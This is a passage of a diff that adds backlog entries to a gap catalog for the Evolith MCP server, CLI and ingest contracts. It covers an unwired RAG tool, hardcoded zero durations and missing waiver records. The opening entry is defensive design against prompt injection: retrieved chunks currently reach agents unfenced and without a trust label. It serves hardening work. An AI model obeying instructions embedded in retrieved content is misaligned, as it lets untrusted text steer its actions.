+- **Component:** `MCP Server` · **Criticality:** P1 · **Complexity:** S
+- **Principal:** `S` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave. **Three framings were REFUTED and must not be re-imported:** "prompt injection appears nowhere in the codebase" is false (ADR-0082 in both languages, `mcp-security.md:539`, `agentic-ai/patterns.md:23` twice); "not a rule, not a test" is false (`AAI-R06` plus `agentic-ai.test.rego:66-70` and two TypeScript evaluators); and the tool named in the candidate, `evolith-read-file`, does not exist — the name survives only in a legacy ABAC set. Exposure is capped today by [`GT-685`](./gap-reference-catalog.md#gt-685), which is an ordering argument, not a reason to defer.
+- **Acceptance criteria:**
+  - [ ] Each chunk carries an explicit trust classification listed in the chunk schema's `required`, verified against a live `tools/call` response rather than the schema alone.
+  - [ ] Emitted text is fenced by a documented delimiter, with a test feeding a chunk whose text CONTAINS the delimiter and asserting it is escaped rather than closing the fence early.
+  - [ ] **FALSIFIABILITY (observed failing first):** an injection-shaped fixture is added and a spec asserts it is marked untrusted and fenced — credited only when that spec is recorded FAILING against the current emitter, showing the raw unfenced text.
+  - [ ] Removing the trust field turns at least one test red, recorded by deleting it, naming the failing test, and restoring it.
+  - [ ] ADR-0082's implementation banner moves off `none`, and its stale claim that no evaluator handles that category is corrected; `44-validate-adr-implementation-status` passes.
+- **Status:** `PENDING`
+
+#### GT-685
+
+**Title:** `evolith-knowledge-search` is registered in every deployment and answerable in none
+
+- **Purpose:** Stop advertising a tool that refuses in every environment we ship.
+- **Evidence:** The tool is registered unconditionally and throws `NOT_IMPLEMENTED` at call time unless `EVOLITH_RAG_PG_URL` or `DATABASE_URL` is set, and **no deployment artifact in this repository sets either for the `mcp` service**: `grep -c "EVOLITH_RAG" product/infra/docker-compose.fullstack.yml product/infra/docker-compose.evolith.yml` → `0` and `0`; no Helm, Kubernetes or kind manifest mentions it; the Coolify runbook and the secrets document contain no RAG variable. Nothing in any deployment populates `rag_chunks` either — the only seeder is a push-triggered workflow that dry-runs without repository variables.
+- **Use cases:**
+  - An agent connected to the deployed gateway calls an advertised tool and gets a hard refusal.
+  - A customer follows the quickstart, which tells them to run `evolith mcp start` — a command that does not exist among the 30 command directories.
+  - An operator wants to enable it and finds the procedure only in prose, with no variable in any compose file to set.
+  - A demo of "governance with institutional memory" cannot be run on the stack we publish.
+- **Impact:** A registered tool that cannot answer anywhere is worse than an absent one: it is discoverable, advertised in the catalog, and refuses on contact.
+- **Expected outcome:** either the compose files provision and wire a pgvector store for `mcp` with an in-deployment seeding path, or they carry the enable procedure themselves — documenting it in a guide does not close it, since that text already exists.
+- **Affected files:** `product/infra/docker-compose.fullstack.yml`, `product/infra/docker-compose.evolith.yml`, `product/infra/README.md`, `docs/guides/evolith-quickstart.md`
+- **Component:** `Infra` · **Criticality:** P2 · **Complexity:** S
+- **Principal:** `S` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave. **Two sub-claims were REFUTED:** the pgvector image is not behind a `--profile rag` opt-in (only the embeddings service is), and the compose file that carries pgvector has no `mcp` service at all and sits on a disjoint network — which makes the wiring question sharper, not softer. **UNCERTAIN and deliberately not upgraded:** whether the live Coolify environment sets `EVOLITH_RAG_PG_URL`; the encrypted environment was not inspected. Needs an explicit carve-out against the `ADR-0101` rule that no Core deployment config carries a `DATABASE_URL`.
+- **Acceptance criteria:**
+  - [ ] The fullstack compose file sets `EVOLITH_RAG_PG_URL` for `mcp`, pointing at a store on the same network.
+  - [ ] The same file provisions the store so its schema exists with no manual step.
+  - [ ] Seeding lives inside the deployment: after bring-up, a knowledge-search call returns at least one chunk with a `sourceFile` under `reference/`, with the literal response recorded.
+  - [ ] **FALSIFIABILITY:** with the store stopped, the same call is observed FAILING — a refusal or a surfaced connection error. A success envelope with zero results falsifies the fix; a silent empty corpus is exactly what the knowledge factory was written to prevent.
+  - [ ] The quickstart stops naming a command that does not exist, or this row states in writing that the quickstart is out of scope.
+- **Status:** `PENDING`
+
+#### GT-686
+
+**Title:** Forty-six envelopes report `durationMs: 0` as a literal, so every consumer reads a fabricated measurement
+
+- **Purpose:** Make the one universal telemetry field in the ADR-0073 envelope carry a measurement instead of a constant.
+- **Evidence:** **Counted first-hand 2026-08-14:** `grep -rn "durationMs: 0" src` excluding `node_modules`, `dist`, `coverage` and specs returns **46 sites**, including `base-command.ts:64` — the CLI base class — plus `evaluate.command.ts:87,145`, `validate.command.ts:191`, `calibrate.command.ts:80`, `audit.command.ts:92`, and on the other surfaces `evaluate.tool.ts:147`, `pattern.tools.ts:33`, `topology.tools.ts:131,186`, `evaluation.controller.ts:158`, `gates.controller.ts:44`, `phases.controller.ts:32`. The schema defines the field as "Wall-clock execution time in milliseconds" and permits `minimum: 0`, which is what let it ship. `gate.command.ts:65` in a neighbouring directory does it correctly with `Date.now() - startedAt`, so this is not a missing convention but 46 departures from one. Separately, `EvaluationIngestPayload` carries no timing member at all, so nothing measured reaches the ledger even if it were measured.
+- **Use cases:**
+  - A ledger row cannot answer how long an evaluation took, and the field it would answer with says zero.
+  - A consumer reading `meta.durationMs` gets a plausible number and cannot tell it is fabricated — worse than an absent field, which is at least honest.
+  - Pricing or budgeting governance runs has no input, on a product whose competitors meter every run.
+  - A performance regression like `GT-648` (a corpus re-read per request) is invisible in the envelope that would have shown it.
+- **Impact:** A constant where a measurement is declared is the same class of defect as a tautological guard: it reports agreement it never checked. Forty-six of them make the envelope's telemetry contract decorative.
+- **Expected outcome:** measured durations on the envelopes, a timing member on the deposit contract, and cost and token members optional and **absent** rather than zero while no LLM SDK is a dependency.
+- **Affected files:** `src/sdk/cli/src/infrastructure/cli/base-command.ts`, `src/sdk/cli/src/commands/**`, `src/packages/mcp-server/src/tools/**`, `src/packages/contracts/src/ingest/evaluation-ingest.ts`
+- **Component:** `Evolith CLI` · **Criticality:** P2 · **Complexity:** S
+- **Principal:** `S` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave, and the count was re-measured here: the candidate reported five sites, the tree carries **46**. **One framing was REFUTED:** "CLI and MCP emit no resource record at all" is false — `durationMs` is a required envelope member and MCP's dispatch computes a real duration for every `tools/call`; the defect is the hardcoded zero, which is worse than an absence. Distinct subject from [`GT-674`](./gap-reference-catalog.md#gt-674), which concerns evidence about the GOVERNED system's LLM runs.
+- **Acceptance criteria:**
+  - [ ] `evolith evaluate --format json` prints `meta.durationMs > 0`, closed by observed stdout rather than by reading the diff.
+  - [ ] The count of non-spec `durationMs: 0` literals goes from 46 to zero, or each survivor is a genuine zero-duration path with a stated reason.
+  - [ ] The deposit contract gains a timing member with a derivation-map entry, and the corresponding input, so the value is handed over rather than synthesized inside the contract package.
+  - [ ] **FALSIFIABILITY:** reverting one site to `durationMs: 0` and running the guard produces a FAILING output, pasted into the closure record.
+  - [ ] The check rejects `durationMs: 0` as a VALUE from a run whose wall clock was non-zero, not merely a missing key.
+  - [ ] **NO INVENTED COST:** a payload emitting `costUsd: 0` or `totalTokens: 0` with no AI signal is rejected; absent must stay distinguishable from zero.
+- **Status:** `PENDING`
+
+#### GT-687
+
+**Title:** The ingest wire carries the waiver bit but not the adjudication record, and the bit cannot distinguish a human from a machine
+
+- **Purpose:** Let the Tracker — and any calibration built on it — tell a human override from an automatic baseline, and know who decided it.
+- **Evidence:** `IngestViolation.frozen` is documented as the "Baseline/waiver flag" and is set both by an approved waiver (`drift-gate.ts:174-185`) and by a machine policy baseline (`policy-baseline.ts:99`), while the `waived[]` array the gate already computes — `waiverRef`, `waiverVersion`, `expiresAt` — plus the approver and the reason are dropped at the wire: `grep -an -i "waived" src/packages/contracts/src/ingest/evaluation-ingest.ts` returns **0 hits** for the array, and the only `waiv` occurrence in 860 lines is the doc comment on `frozen`, which the oracle requires and which drives `blockingViolationCount`. The return leg does not exist either: `grep -rn -iE "http|url|fetch" src/sdk/cli/src/commands/calibrate/calibrate.command.ts` → **0**; the command reads `--labels <path>` off local disk.
+- **Use cases:**
+  - A Tracker reading `frozen: true` cannot tell whether a human accepted the risk or a machine baselined it.
+  - [`GT-670`](./gap-reference-catalog.md#gt-670)'s calibration corpus cannot be assembled from deposited rows, because no approver, reason or expiry crosses the wire.
+  - A rejected waiver has no representation at all, so a corpus built from the wire contains only disagreement and every rate reads 100 %.
+  - An auditor reconstructing a decision has the effect and not the decision.
+- **Impact:** The one organic adjudication signal the product captures cannot leave the machine that captured it — which caps the measurement story two rows above it depend on.
+- **Expected outcome:** a `suppression: { kind: 'baseline' | 'waiver', waiverRef?, waiverVersion?, expiresAt?, approvedBy?, reason? }` member with derivation entries, plus a named Tracker-side read route or an explicit written deferral.
+- **Affected files:** `src/packages/contracts/src/ingest/evaluation-ingest.ts`, `src/packages/core-domain/src/evaluation/drift-gate.ts`, `src/sdk/cli/src/commands/calibrate/calibrate.command.ts`
+- **Component:** `Core Domain` · **Criticality:** P2 · **Complexity:** S
+- **Principal:** `S` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode benchmark wave. **Four framings were REFUTED:** the wire is not adjudication-free (the `frozen` bit is there and is oracle-required); the ingest endpoint runs Core→Tracker, so enriching it does not "travel back to the Core"; a human decision already crosses the wire elsewhere (`tracker-approval.http-client.ts:16` returns status, approver and reason for agent skill intents); and `violations[].fingerprint` is already carried. **Blocked by [`GT-677`](./gap-reference-catalog.md#gt-677):** no production caller supplies waivers today, so there is nothing for the enriched member to carry until that lands.
+- **Acceptance criteria:**
+  - [ ] `IngestViolation` distinguishes baseline from waiver, with field-source rows resolving against an object produced by the REAL drift-gate pipeline so the existing derivation walk covers them.
+  - [ ] A production call site passes waivers to the gate and an end-to-end test asserts an approved waiver produces a deposited payload with `suppression.kind === 'waiver'` and the matching reference.
+  - [ ] **FALSIFIABILITY:** a waiver-suppressed violation with no reference, and a policy-baseline freeze reported as a waiver, are each REJECTED by the payload oracle with a named problem string; a change that makes the oracle accept them turns the suite red.
+  - [ ] **ANTI-VACUITY:** renaming `Waiver.waiverRef` in the domain turns the ingest spec red rather than leaving the wire silently unsourced.
+  - [ ] The return leg is named: a Tracker-side read route is specified and `calibrate` can source from it, with a test driving the command against a stubbed fetch — or the deferral to the Tracker repository is stated in writing.
+  - [ ] A rejected waiver is representable and maps to `humanBlocked: true`, asserted in both polarities — [`GT-670`](./gap-reference-catalog.md#gt-670)'s confirming-label trap.
+- **Status:** `PENDING`
